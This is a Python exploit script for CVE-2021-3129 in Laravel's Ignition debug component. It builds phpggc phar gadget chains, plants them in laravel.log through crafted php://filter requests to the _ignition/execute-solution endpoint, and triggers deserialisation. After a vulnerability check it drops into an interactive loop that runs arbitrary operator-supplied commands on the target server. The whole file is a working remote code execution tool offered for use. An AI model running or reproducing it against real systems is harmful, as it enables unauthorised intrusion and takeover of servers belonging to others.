# -*- coding:utf-8 -*-
import requests
import os
import re

payload = [
    """php -d "phar.readonly=0" phpggc Laravel/RCE1 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Laravel/RCE2 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Laravel/RCE3 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Laravel/RCE4 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Laravel/RCE5 "system('{}');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Laravel/RCE6 "system('{}');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Laravel/RCE7 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Monolog/RCE1 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Monolog/RCE2 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Monolog/RCE3 system '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """,
    """php -d "phar.readonly=0" phpggc Monolog/RCE4 '{}' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """
]


# pay ="""php -d "phar.readonly=0" phpggc Laravel/RCE5 "system('{}');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" """


# phpggc = ""


def poc(url):
    url = url + "_ignition/execute-solution"
    data = {
        "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
        "parameters[variableName]": "cve20213129",
        "parameters[viewFile]": "null"
    }
    response = requests.post(url=url, data=data)

    # 获取返回值
    if response.status_code == 500:
        print(str(response.status_code) + " 存在漏洞")
        for i in payload:
            a = os.popen(i.format('id').strip())
            phpggc = a.read().strip()

            data = {
                "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
                "parameters[variableName]": "cve20213129",
                "parameters[viewFile]": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
            }
            response = requests.post(url=url, data=data)
            # print(response.status_code)
            response = requests.post(url=url, data=data)

            # 获取返回值
            if response.status_code == 500 or response.status_code == 200:
                # print(str(response.status_code)+"清空log文件")
                pass

            # 从phpggc拿一条能用的链子写入log

            # #发送AA用于对齐
            data2 = {
                "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
                "parameters[variableName]": "cve20213129",
                "parameters[viewFile]": "AA"
            }
            response2 = requests.post(url=url, data=data2)
            if response2.status_code == 500:
                # print(str(response2.status_code)+"发送AA用于对齐")
                pass

            # 将payload从viewFile参数POST传过去(记得添加一个字符)
            data3 = {
                "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
                "parameters[variableName]": "cve20213129",
                "parameters[viewFile]": phpggc+"a"
            }
            response3 = requests.post(url=url, data=data3)
            if response3.status_code == 500:
                # print(str(response2.status_code)+"将payload从viewFile参数POST传过去")
                pass

            # 清空干扰字符
            data4 = {
                "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
                "parameters[variableName]": "cve20213129",
                "parameters[viewFile]": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
            }
            response4 = requests.post(url=url, data=data4)
            if response4.status_code == 500:
                # print(str(response4.status_code)+"清空干扰字符")
                pass

            # phar反序列化
            data5 = {
                "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
                "parameters[variableName]": "cve20213129",
                "parameters[viewFile]": "phar://../storage/logs/laravel.log/test.txt"
            }
            response5 = requests.post(url=url, data=data5)
            html = response5.text
            if response5.status_code == 500:
                # print(str(response5.status_code)+"phar反序列化")
                # print(html)
                # print("--------------")
                try:
                    if re.compile(r'</body>\n</html>\n(.*?)\n'):
                        pattern = re.compile(r'</body>\n</html>\n(.*?)\n')
                        result = pattern.findall(html)
                        print(result[0])
                        exp(url, i)

                except:
                    # print("无输出")
                    pass

        else:
            print("未检出漏洞！")


def exp(url, i):
    # 使用php://filter过滤器组合拳清空log文件,执行两次
    # url = url + "_ignition/execute-solution"
    # print(i)

    print(url)
    while True:
        shell = input("> ")
        q = i.format(shell).strip()
        # print(q)
        a = os.popen(q)
        phpggc = a.read().strip()
        # print(phpggc)

        data = {
            "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
            "parameters[variableName]": "cve20213129",
            "parameters[viewFile]": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        }
        response = requests.post(url=url, data=data)
        # print(response.status_code)
        response = requests.post(url=url, data=data)

        # 获取返回值
        if response.status_code == 500 or response.status_code == 200:
            # print(str(response.status_code)+"清空log文件")
            pass

        # 从phpggc拿一条能用的链子写入log

        # #发送AA用于对齐
        data2 = {
            "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
            "parameters[variableName]": "cve20213129",
            "parameters[viewFile]": "AA"
        }
        response2 = requests.post(url=url, data=data2)
        if response2.status_code == 500:
            # print(str(response2.status_code)+"发送AA用于对齐")
            pass

        # 将payload从viewFile参数POST传过去(记得添加一个字符)
        data3 = {
            "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
            "parameters[variableName]": "cve20213129",
            "parameters[viewFile]": phpggc+"a"
        }
        response3 = requests.post(url=url, data=data3)
        if response3.status_code == 500:
            # print(str(response2.status_code)+"将payload从viewFile参数POST传过去")
            pass

        # 清空干扰字符
        data4 = {
            "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
            "parameters[variableName]": "cve20213129",
            "parameters[viewFile]": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        }
        response4 = requests.post(url=url, data=data4)
        if response4.status_code == 500:
            # print(str(response4.status_code)+"清空干扰字符")
            pass

        # phar反序列化
        data5 = {
            "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
            "parameters[variableName]": "cve20213129",
            "parameters[viewFile]": "phar://../storage/logs/laravel.log/test.txt"
        }
        response5 = requests.post(url=url, data=data5)
        html = response5.text
        if response5.status_code == 500:
            # print(str(response5.status_code)+"phar反序列化")
            # print(html)
            # print("--------------")
            try:
                pattern = re.compile(r'</html>(.*)', re.DOTALL)
                result = pattern.search(html).group(1)
                print(result.strip())

            except:
                print("无输出")


def main():
    url = input("输入url：")
    poc(url)

    # shell = input("> ")

    # for i in payload:
    #     a = os.popen(i.strip().format(shell))
    #     b = a.read()
    #     print(b)


if __name__ == '__main__':
    main()
